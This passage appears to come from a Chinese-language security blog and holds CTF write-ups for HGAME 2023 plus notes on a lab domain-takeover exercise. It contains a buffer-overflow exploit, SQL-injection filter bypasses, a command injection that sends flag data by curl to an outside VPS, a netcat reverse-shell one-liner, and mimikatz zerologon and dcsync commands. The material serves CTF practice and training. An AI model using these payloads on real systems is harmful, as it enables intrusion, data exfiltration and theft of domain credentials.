class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">d = &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ba1van4ba1van4</span></span><br><span class="line"><span class="string">21级 / 不会Re / 不会美工 / 活在梦里 / 喜欢做不会的事情 / ◼◻粉</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">yolandeyolande</span></span><br><span class="line"><span class="string">21级 / 非常菜的密码手 / 很懒的摸鱼爱好者，有点呆，想学点别的但是一直开摆</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">t0hkat0hka</span></span><br><span class="line"><span class="string">21级 / 日常自闭的Re手</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">h4kuy4h4kuy4</span></span><br><span class="line"><span class="string">21级 / 菜鸡pwn手 / 又菜又爱摆</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s1 = s.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="string">&quot;&quot;</span> <span class="keyword">in</span> s1:<span class="comment"># 判断是否有空值在列表中</span></span><br><span class="line">    s1.remove(<span class="string">&quot;&quot;</span>)<span class="comment"># 如果有就直接通过remove删除</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s1)):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        key = s1[i][<span class="number">0</span>:<span class="built_in">int</span>(<span class="built_in">len</span>(s1[i])/<span class="number">2</span>)]</span><br><span class="line">        <span class="comment"># print(key)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        value = s1[i]</span><br><span class="line">        <span class="comment"># print(value)</span></span><br><span class="line">        d[key]=value</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment">#键和值互换</span></span><br><span class="line">d = <span class="built_in">dict</span>(<span class="built_in">zip</span>(d.values(), d.keys()))</span><br><span class="line"><span class="comment">#21:mingzi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = <span class="string">&quot;session=MTY3MzA3MjkwM3xEdi1CQkFFQ180SUFBUkFCRUFBQU9fLUNBQUlHYzNSeWFXNW5EQTBBQzJOb1lXeHNaVzVuWlVsa0EybHVkQVFDQUI0R2MzUnlhVzVuREFnQUJuTnZiSFpsWkFOcGJuUUVBZ0FJfKAl_lYBbx-VHq4BBl3686G2F3ThoYf7RvWQiatnCUqN&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;http://week-1.hgame.lwsec.cn:31660/api/getQuestion&quot;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json, text/plain, */*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://week-1.hgame.lwsec.cn:31660&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://week-1.hgame.lwsec.cn:31660/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: session,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    text = requests.get(url,headers=headers)</span><br><span class="line">    ans = <span class="built_in">eval</span>(text.text)</span><br><span class="line">    <span class="comment">#&#123;&#x27;message&#x27;: &#x27;20级 / WEB / 菜的抠脚 / 想学GO&#x27;&#125;</span></span><br><span class="line">    answord = <span class="built_in">str</span>(ans[<span class="string">&#x27;message&#x27;</span>])</span><br><span class="line">    <span class="built_in">print</span>(answord)</span><br><span class="line">    <span class="keyword">if</span> answord <span class="keyword">in</span> d.keys():</span><br><span class="line">        <span class="built_in">print</span>(d[answord])</span><br><span class="line">        daan = d[answord]</span><br><span class="line">        data=&#123;</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>: daan,</span><br><span class="line">    &#125;</span><br><span class="line">        url_verifyAnswer = <span class="string">&quot;http://week-1.hgame.lwsec.cn:31660/api/verifyAnswer&quot;</span></span><br><span class="line">        text_verifyAnswer = requests.post(url = url_verifyAnswer,data=data,headers=headers)</span><br><span class="line">        <span class="comment"># print(text_verifyAnswer.text)</span></span><br><span class="line">        <span class="comment"># print(text_verifyAnswer.headers[&#x27;Set-Cookie&#x27;])</span></span><br><span class="line">        url_Score = <span class="string">&quot;http://week-1.hgame.lwsec.cn:31660/api/getScore&quot;</span></span><br><span class="line">        text_Score = requests.get(url = url_Score,data=data,headers=headers)</span><br><span class="line">        <span class="built_in">print</span>(text_Score.text)</span><br><span class="line">        <span class="comment"># print(text_verifyAnswer.headers[&#x27;Set-Cookie&#x27;])</span></span><br><span class="line">        sesson = re.findall(<span class="string">&quot;(.*?); Path=/&quot;</span>,text_verifyAnswer.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])</span><br><span class="line">        session = sesson[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(session)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><h4 id="Show-Me-Your-Beauty"><a href="#Show-Me-Your-Beauty" class="headerlink" title="Show Me Your Beauty"></a>Show Me Your Beauty</h4><p>简单文件上传，黑名单的php fuzz一下，大小写绕过就可以了，上传shell之后，蚁剑，flag在跟下</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230107160532176.png" alt="image-20230107160532176"></p><h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>简单rsa n,e,d,都给了，使用大佬的工具所就行了</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230107161606240.png" alt="image-20230107161606240"></p><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h4><p>nc ip port 就可以执行命令了</p><h4 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h4><p>这个简单溢出题没见过，记录一下<br>点击main函数，然后F5查看伪源码,可以看到buf处存在溢出，但是有个close(1)，<br>close（1）关闭了标准输出<br>参考<code>https://blog.csdn.net/xirenwang/article/details/104139866</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈 10+8 backdoor 401176</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230207170004991.png" alt="image-20230207170004991"></p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230207170036399.png" alt="image-20230207170036399"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./vuln&quot;)</span></span><br><span class="line">p= remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="string">&quot;32588&quot;</span>)</span><br><span class="line">backdoor = <span class="number">0x401176</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;Welcome!May I have your name?\n&quot;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#or</span></span><br><span class="line"><span class="comment">#p.sendline(&#x27;ls 1&gt;&amp;0&#x27;)</span></span><br><span class="line"><span class="comment">#p.sendline(&#x27;cat flag 1&gt;&amp;0&#x27;)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230207170801337.png" alt="image-20230207170801337"></p><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h3><h4 id="Git-Leakage"><a href="#Git-Leakage" class="headerlink" title="Git Leakage"></a>Git Leakage</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root💀bohemian)-[/tools/GitHack/dist]</span><br><span class="line">└─<span class="comment"># cd week-2.hgame.lwsec.cn_31248</span></span><br><span class="line"></span><br><span class="line">┌──(root💀bohemian)-[/tools/GitHack/dist/week-<span class="number">2.</span>hgame.lwsec.cn_31248]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">Th1s_1s-flag</span><br><span class="line"></span><br><span class="line">┌──(root💀bohemian)-[/tools/GitHack/dist/week-<span class="number">2.</span>hgame.lwsec.cn_31248]</span><br><span class="line">└─<span class="comment"># cat Th1s_1s-flag</span></span><br><span class="line">hgame&#123;Don<span class="string">&#x27;t^put*Git-in_web_directory&#125;</span></span><br></pre></td></tr></table></figure><h4 id="v2board"><a href="#v2board" class="headerlink" title="v2board"></a>v2board</h4><p><a href="https://www.youtube.com/watch?v=yfneS2R-Pn8&amp;ab_channel=%E4%B8%8D%E8%89%AF%E6%9E%97">https://www.youtube.com/watch?v=yfneS2R-Pn8&amp;ab_channel=%E4%B8%8D%E8%89%AF%E6%9E%97</a></p><h4 id="Search-Commodity"><a href="#Search-Commodity" class="headerlink" title="Search Commodity"></a>Search Commodity</h4><p>弱口令，爆破一下</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230213151310768.png" alt="image-20230213151310768"></p><p>user01<br>admin123</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">search_id=1  显然注入了</span><br><span class="line">search_id=1/**/order/**/by/**/1    //Error Occurred  空格被过滤 /**/</span><br><span class="line">search_id=1/*123*/order/*123*/by/*123*/1    //Error Occurred  /**/ 被过滤 用/*123*/ 替换</span><br><span class="line">search_id=1/*123*/order/*123*/by/*123*/1    //Error Occurred</span><br><span class="line">//这里语句没有问题，猜测是or被过滤了，我们在加一个or</span><br><span class="line">search_id=1/*123*/oorrder/*123*/by/*123*/1    //hard disk1</span><br><span class="line">//这里oorrder 成功，我们可以猜测后台是吧or替换为空了,</span><br><span class="line">注出3个字段</span><br><span class="line">search_id=-1/*1123*/union/*1123*/select/*2123*/2,3,4     //Error Occurred</span><br><span class="line">这里猜测是union select 替换了，因为上面也or替换了</span><br><span class="line">search_id=-1/*1123*/ununionion/*1123*/selselectect/*2123*/2,3,4</span><br><span class="line">or  大小写</span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,3,database() //Error Occurred</span><br><span class="line"></span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,Database(),4 //database  双写or大写 //se4rch   4</span><br><span class="line"></span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,Group_concat(table_name)/*2123*/frOm/*2123*/infoorrmation_schema.tables/*2123*/whEre/*2123*/table_schema/*2123*/like/*2123*/&#x27;se4rch&#x27;</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line"></span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,datadatabasebase(),4</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h3><h4 id="Ping-To-The-Host"><a href="#Ping-To-The-Host" class="headerlink" title="Ping To The Host"></a>Ping To The Host</h4><p>ping to host<br>无回显</p><p>vps监听 <code>nc -lkvvnp 7777</code></p><p>有过滤  如果不加base64   会不显示</p><p>ip=127.0.0.1%26%26curl%09<a href="http://182.92.176.62:7777/%60nl%09/f*|base64%60">http://182.92.176.62:7777/`nl%09/f*|base64`</a>  </p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230201105313163.png" alt="image-20230201105313163"></p><p>/ICAgICAxCWhnYW1le3AxbkdfdDBfQ29tTTRuRF9FeGVjVXQxb25fZEFuZ0VyUnJSclJyUiF9Cg==</p><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="web-3"><a href="#web-3" class="headerlink" title="web"></a>web</h3><h4 id="Tell-Me"><a href="#Tell-Me" class="headerlink" title="Tell Me"></a>Tell Me</h4><p>bind xxe</p><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="ezwin"><a href="#ezwin" class="headerlink" title="ezwin"></a>ezwin</h4><p>这个题比较有意思了，这里Volatility 3 和Volatility 2有截然不同的结果，不是很理解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 vol.py -f /tools/ctf/2023hgame/win10_22h2_19045.2486.vmem windows.envars.Envars | grep hgame</span><br><span class="line">3492resssihost.exe      0x222e2561bc0canHGAME_FLAGhed   hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3520    svchost.exe     0x1d2f6e033d0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3528    svchost.exe     0x163d90033d0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3668    taskhostw.exe   0x1ced6651bc0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3828    ctfmon.exe      0x1e2d9081bc0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3992    explorer.exe    0x1151bf0       HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀bohemian)-[/tools/volatility]</span><br><span class="line">└─# python2 vol.py -f /tools/ctf/hgame/win10_22h2_19045.2486.vmem --profile=Win10x64_19041 envars | grep hgame</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">    3492 sihost.exe           0x00000222e2560fe0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3520 svchost.exe          0x000001d2f6e027f0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3528 svchost.exe          0x00000163d90027f0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3668 taskhostw.exe        0x000001ced6650fe0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3828 ctfmon.exe           0x000001e2d9080fe0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3992 explorer.exe         0x0000000006607a60 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Bohemian)-[/tools/volatility3]</span><br><span class="line">└─<span class="comment"># python3 vol.py -f /tools/ctf/2023hgame/win10_22h2_19045.2486.vmem windows.hashdump</span></span><br><span class="line">Volatility 3 Framework 2.4.1</span><br><span class="line">Progress:  100.00               PDB scanning finished</span><br><span class="line">User    rid     lmhash  nthash</span><br><span class="line"></span><br><span class="line">Administrator   500     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">Guest   501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">DefaultAccount  503     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">WDAGUtilityAccount      504     aad3b435b51404eeaad3b435b51404ee        c4b2cf9cac4752fc9b030b8ebc6faac3</span><br><span class="line">Noname  1000    aad3b435b51404eeaad3b435b51404ee        84b0d9c9f830238933e7131d60ac6436</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀bohemian)-[/tools/volatility]</span><br><span class="line">└─# python2 vol.py -f /tools/ctf/hgame/win10_22h2_19045.2486.vmem --profile=Win10x64_19041 hashdump</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Administrator:500:6a21484f766d3766175c3a3f7763e688:b08b01ca485aea836bacb3aad6c45b26:::</span><br><span class="line">Guest:501:6a0af1d516e75dd696266273ce666e21:82e20e246547aa3ae431aec52f53cdf5:::</span><br><span class="line">DefaultAccount:503:ce2bccae5ac352b8e38c1d3194475940:4a947667f1ab4136246644fa344650b3:::</span><br><span class="line">WDAGUtilityAccount:504:efa88db8c9ac1b9f5798999b03241b90:611c4a5c71e01e167d8ef049135ff150:::</span><br><span class="line">Noname:1000:f4272abfe4b751256f7b4a0932246690:3454cf62689ec53e97581f7a3312c3a9:::</span><br></pre></td></tr></table></figure><p>volatility 2 filescan 时我们可以看到有个flag.7z 题目提示也给了，这里dumpfiles时 -q 提取不来东西，</p><p>但是可以-pid 找到压缩文件的进程号，这样会提取出来一下无关的文件，写个简单脚本 看看那个是zip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> ./*</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        file <span class="variable">$file</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216150417789.png" alt="image-20230216150417789"></p><p>可以看到两个7-zip文件，拖到win下  然后解一下</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216151102965.png" alt="image-20230216151102965"></p><p>我们可以看到这个6270的dat文件可以解压出来东西，但是呢，这个txt被wannaren加密了，经过搜索，火绒有一个可以解密的软件</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216152439725.png" alt="image-20230216152439725"></p><p>新佛曰，解出来提交发现不对，问了一下出题人，发现不对，说要用volatility 3，题目其实也提示了要用三，当时机器没有三，我就用三重新做一遍，一样的步骤，提出来的就不要一样。后来我去搜了这个新佛曰的码，发现是2022年的题。同一个环境但是提出来的压缩包不一样，不太清楚。</p><p>用volatility 3从新做一下，</p><p>python3 vol.py -f /tools/ctf/2023hgame/win10_22h2_19045.2486.vmem windows.dumpfiles –pid 7584</p><p>这里我使用这个命令提的，这样会提出来一大堆文件，同样用脚本判断一下那个zip,这个根据名字也能大概猜出</p><p>file.0xd00641b5ba70.0xd00641180e30.DataSectionObject.flag.7z.dat</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216153755607.png" alt="image-20230216153755607"></p><p>打开可以看到密码是解出来hash</p><p>84b0d9c9f830238933e7131d60ac6436</p><p>查询结果： asdqwe123</p><p>就可以了</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><blockquote><p>一直在路上</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> PWN </tag>
            
            <tag> Volatility </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022弱口令安全实验室招新赛-靶机挑战</title>
      <link href="/2023/01/05/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9B-%E9%9D%B6%E6%9C%BA%E6%8C%91%E6%88%98/"/>
      <url>/2023/01/05/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9B-%E9%9D%B6%E6%9C%BA%E6%8C%91%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230105144545334.png" alt="image-20230105144545334"></p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230105144556972.png" alt="image-20230105144556972"></p><p><a href="https://www.iculture.cc/rce/">https://www.iculture.cc/rce/</a></p><p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 192.168.144.128 9990 &gt;/tmp/f</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230105145002174.png" alt="image-20230105145002174"></p><p>setg Proxies socks5:192.168.144.128:1080 #设置全局代理<br>set ReverseAllowProxy true #这个参数是因为使用全局代理，可能会导致我们的shell无法反弹，所以需要开启。</p><p>setg Proxies socks5:192.168.144.136:8888 #设置全局代理<br>set ReverseAllowProxy true #这个参数是因为使用全局代理，可能会导致我们的shell无法反弹，所以需要开启。</p><p>:&gt;fscan.exe -h 192.168.48.1/24<br>fscan.exe -h 192.168.48.1/24</p><hr><p>  / _ \     ___  ___ _ __ __ _  <em><strong>| | __<br> / /<em>/</em></strong></em>/ __|/ <strong>| ‘</strong>/ <em>` |/ <strong>| |/ /<br>/ /<em>\_</em></strong></em>__ \ (<strong>| | | (_| | (</strong>|   &lt;<br>____/     |___/___|_|  __,_|___|_|_<br>                     fscan version: 1.6.3<br>start infoscan<br>(icmp) Target ‘192.168.48.128’ is alive<br>(icmp) Target ‘192.168.48.200’ is alive<br>icmp alive hosts len is: 2<br>192.168.48.200:139 open<br>192.168.48.128:139 open<br>192.168.48.128:88 open<br>192.168.48.200:445 open<br>192.168.48.128:445 open<br>192.168.48.200:135 open<br>192.168.48.128:135 open<br>alive ports len is: 7<br>start vulscan<br>[+] 192.168.48.200      MS17-010        (Windows Server 2008 R2 Datacenter 7600)<br>[<em>] 192.168.48.200       WEAK\WIN-S96L5Q5A734   Windows Server 2008 R2 Datacenter 7600<br>NetInfo:<br>[*]192.168.48.128<br>   [-&gt;]WIN-JK2FG246GEF<br>   [-&gt;]192.168.48.128<br>[</em>] 192.168.48.128 [+]DC WEAK\WIN-JK2FG246GEF   Windows Server 2008 R2 Datacenter 7600<br>[+] 192.168.48.128      MS17-010        (Windows Server 2008 R2 Datacenter 7600)<br>已完成 9/9<br>scan end</p><p>WIN-JK2FG246GEF$</p><p>kiwi_cmd “lsadump::zerologon /target:192.168.48.128 /account:WIN-JK2FG246GEF$” exit</p><p>mimikatz.exe “lsadump::zerologon /target:192.168.48.128 /account:DC01$” exit</p><p>kiwi_cmd “lsadump::dcsync /domain:WEAK.COM /dc:WIN-JK2FG246GEF.WEAK.COM /user:administrator /authuser:WIN-JK2FG246GEF$ /authdomain:WEAK /authpassword: /authntlm”</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulntarget-c</title>
      <link href="/2022/11/29/vulntarget-c/"/>
      <url>/2022/11/29/vulntarget-c/</url>
      
